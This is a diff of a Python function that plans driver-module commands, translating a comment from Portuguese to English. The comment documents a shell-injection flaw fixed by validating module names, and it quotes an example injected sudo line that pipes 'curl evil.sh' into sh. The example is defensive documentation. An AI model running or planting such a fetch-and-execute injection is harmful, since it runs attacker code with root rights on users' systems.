@@ -131,20 +131,20 @@ def plan_state_b(
     if not module:
         raise ValueError("feasible chipset without any candidate module")
 
-    # VALIDACAO OBRIGATORIA ANTES DE MONTAR COMANDO (ADR 0002 S1/S3/S6).
+    # MANDATORY VALIDATION BEFORE BUILDING THE COMMAND (ADR 0002 S1/S3/S6).
     #
-    # `module` chega de tres origens NAO CONFIAVEIS: bound_driver e
-    # loaded_module vem do sysfs do host, e preferred_module/new_id_modules vem
-    # do JSON da base de conhecimento. Nenhuma delas era validada, e o valor era
-    # interpolado direto em strings de shell montadas logo abaixo — inclusive
-    # dentro de aspas simples e de um caminho.
+    # `module` arrives from three UNTRUSTED origins: bound_driver and
+    # loaded_module come from the host sysfs, and preferred_module /
+    # new_id_modules come from the knowledge-base JSON. None of them was
+    # validated, and the value was interpolated straight into shell strings
+    # built below — including inside single quotes and a path.
     #
-    # Uma aspa simples no nome escapava do quoting e emendava comando arbitrario
-    # numa linha que o proprio produto manda o usuario rodar com sudo:
+    # A single quote in the name escaped the quoting and appended an arbitrary
+    # command to a line the product itself tells the user to run with sudo:
     #
     #   echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id
     #
-    # `require_module_name` ja existia e simplesmente nao era chamada aqui.
+    # `require_module_name` already existed and simply was not called here.
     module = require_module_name(module)
 
     conf_path = f"/etc/modprobe.d/ddr-{vid}-{pid}.conf"
